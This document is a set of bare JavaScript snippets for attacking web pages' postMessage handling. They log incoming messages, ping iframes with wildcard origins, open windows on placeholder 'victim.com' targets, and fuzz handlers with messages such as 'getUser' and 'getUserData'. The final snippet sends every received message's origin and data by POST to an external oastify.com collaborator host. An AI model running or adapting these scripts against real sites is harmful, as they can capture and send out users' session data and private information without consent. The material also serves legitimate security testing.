<script>
window.addEventListener("message", (event) => {
    console.log("ðŸ“© postMessage received");
    console.log("Origin:", event.origin);
    console.log("Source window:", event.source);
    console.log("Data:", event.data);
});
</script>
<script>
function hookIframe(iframe) {
    try {
        console.log("ðŸ§© iframe found:", iframe.src || "[inline iframe]");
        
        iframe.contentWindow?.postMessage(
            { probe: "ping" },
            "*"
        );
    } catch (e) {
        console.warn("Cross-origin iframe:", iframe.src);
    }
}

// Existing iframes
document.querySelectorAll("iframe").forEach(hookIframe);

// Watch for new iframes
new MutationObserver(mutations => {
    for (const m of mutations) {
        for (const node of m.addedNodes) {
            if (node.tagName === "IFRAME") {
                hookIframe(node);
            }
        }
    }
}).observe(document.body, { childList: true, subtree: true });
</script>
<script>
const targets = [
    "https://victim.com",
    "https://app.victim.com"
];

targets.forEach(url => {
    const w = window.open(url);
    
    setTimeout(() => {
        w.postMessage(
            { type: "test", action: "ping" },
            "*"
        );
    }, 2000);
});
</script>
<script>
const commonMessages = [
    { type: "init" },
    { action: "init" },
    { event: "ready" },
    { method: "getUser" },
    { cmd: "getState" }
];

window.addEventListener("message", e => {
    console.log("Response:", e.data);
});

const iframe = document.querySelector("iframe");

commonMessages.forEach(msg => {
    iframe.contentWindow.postMessage(msg, "*");
});
</script>
<script>
if (window.parent !== window) {
    window.parent.postMessage({
        type: "request",
        action: "getUserData"
    }, "*");
}
</script>
<script>
window.addEventListener("message", e => {
    fetch("https://fp8r5nhd9sdnd53otw9uc6a5qwwnkd82.oastify.com", {
        method: "POST",
        body: JSON.stringify({
            origin: e.origin,
            data: e.data
        })
    });
});
</script>
